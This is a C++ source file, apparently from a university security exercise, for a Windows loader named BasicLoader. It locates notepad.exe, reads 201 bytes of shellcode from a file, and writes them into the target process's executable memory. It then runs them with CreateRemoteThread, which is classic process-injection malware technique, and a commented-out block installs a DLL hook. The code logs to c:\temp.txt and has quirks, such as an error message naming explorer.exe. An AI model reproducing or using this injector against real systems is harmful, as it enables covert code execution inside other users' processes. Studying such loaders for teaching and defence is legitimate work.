// BasicLoader.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
FILE* f;
int str_ends_with(const char * str, const char * suffix) {

  if( str == NULL || suffix == NULL )
	return 0;

  size_t str_len = strlen(str);
  size_t suffix_len = strlen(suffix);

  if(suffix_len > str_len)
	return 0;

  return 0 == _stricmp( str + str_len - suffix_len, suffix);
}


void _die(char * arg, int retVal) {
	fopen_s(&f, "c:\\temp.txt", "a");
	fprintf(f, "DIE(%d): %s\n", retVal, arg);
	fclose(f);
	if (retVal != 0) {
		fprintf(stderr, arg);
	} else {
		printf(arg);
	}
	exit(retVal);
};

void _die(char * arg) {
	_die(arg, -1);
};

#define DLL_FILE_NAME "cptnhook.dll"
#define PROC_NAME "HookProc"

BOOL _isProcessNamed(DWORD processID, const char * name) {
	char processName[MAX_PATH];
	processName[0] = NULL;
	HANDLE hProcess = OpenProcess( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ , FALSE, processID);
	if (hProcess != NULL) {
		HMODULE hMod;
		DWORD cbNeeded;
		if (EnumProcessModules( hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
			GetModuleBaseNameA(hProcess, hMod, processName, sizeof(processName)/sizeof(TCHAR));
		}
	}
	CloseHandle(hProcess);
	f = fopen("c:\\temp.txt", "a");
	fprintf(f, "%s\n", processName);
	fclose(f);
	return 0 == _stricmp(processName, name);
}

/*
 * returns the pid of the first process named `name`
 */
DWORD findProcessByName(const char * name) {
	DWORD aProcesses[1024], cbNeeded, cProcesses;
	unsigned int i;
	if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)) {
		return NULL;
	}
	cProcesses = cbNeeded / sizeof(DWORD);
	for (i = 0; i < cProcesses; i++) {
		if( aProcesses[i] != NULL) {
			if (_isProcessNamed(aProcesses[i], name)) {
				return aProcesses[i];
			}
		}
	}
	return NULL;
}

int _tmain(int argc, _TCHAR* argv[]) {
	typedef HHOOK (*HINSTALLER)(HMODULE);
	typedef BOOL (*HUNINSTALLER)(HHOOK);
	fopen_s(&f, "c:\\temp.txt", "w");
	fclose(f);

	int pid = findProcessByName("notepad.exe");
	if (pid == NULL) {
		_die("Failed to find explorer.exe");
	}
	fopen_s(&f, "c:\\temp.txt", "a");
	fprintf(f, "pid: %d\n", pid);
	fclose(f);
	HANDLE process = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION, FALSE, pid);
	if (process == NULL) {
		_die("Failed to OpenProcess !");
	}
	fopen_s(&f, "c:\\temp.txt", "a");
	fprintf(f, "pHandle: %d\n", process);
	fclose(f);

	FILE* inject = NULL;
	byte buf[201];
	int ret =fopen_s(&inject,"C:\\Documents and Settings\\Administrator\\My Documents\\GitHub\\kj-security-ex1\\ex4\\InjectMe.dat","rb");
	if (NULL != ret){

		_die("Failed to open InjectMe !");
	}
	size_t bytesRead = fread(buf,1,201,inject);
	if (201 != bytesRead){
		_die("Failed to read enough !");
	}
	
	fclose(inject);

	LPVOID address = VirtualAllocEx(process, NULL, bytesRead, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (address == NULL) {
		CloseHandle(process);
		_die("Failed to VirtualAllocEx !");
	}

	SIZE_T bytesWritten = 0;
	BOOL wrote = WriteProcessMemory(process,address,buf,sizeof(buf),&bytesWritten);
	if (NULL == wrote){
		_die("Failed to write memory !");
	}
	if (bytesWritten != sizeof(buf)){
		_die("Failed to write enough memory !");
	}
	DWORD oldProtect = NULL;
	BOOL changed = VirtualProtectEx(process,address,sizeof(buf),PAGE_EXECUTE_READWRITE,&oldProtect);
	if (!changed){
				int err = GetLastError();
		fopen_s(&f, "c:\\temp.txt", "a");
		fprintf(f, "err: %d\n", err);
		fclose(f);
		_die("Failed to change permission!");

	}

	HANDLE hThread = CreateRemoteThread(process,NULL,NULL,(LPTHREAD_START_ROUTINE)address,NULL,NULL,NULL);
	if (NULL == hThread){
		_die("Failed to create remote thread !");
	}

	BOOL freeOK = VirtualFreeEx(process, address, 0, MEM_RELEASE);
	if (!freeOK) {
		CloseHandle(process);
		_die("Failed to VirtualFreeEx !");
	}

// TODO

	CloseHandle(process);
/*
	HMODULE hMod = LoadLibraryA(DLL_FILE_NAME);
	if (NULL == hMod) {
		_die("Failed to LoadLibraryA !");
	}
	HINSTALLER installProc = (HINSTALLER)GetProcAddress(hMod, "install");
	if (NULL == installProc) {
		_die("Failed to GetProcAddress !");
	}
	HHOOK hookHandle = installProc(hMod);
	if (NULL == hookHandle) {
		_die("Failed to SetWindowsHookEx !");
	}
	int i;
	scanf_s("%d",&i);
	HUNINSTALLER uninstallProc = (HUNINSTALLER)GetProcAddress(hMod, "uninstall");
	if (NULL == uninstallProc) {
		_die("Failed to GetProcAddress 2 !");
	}
	uninstallProc(hookHandle);
*/
	return 0;
}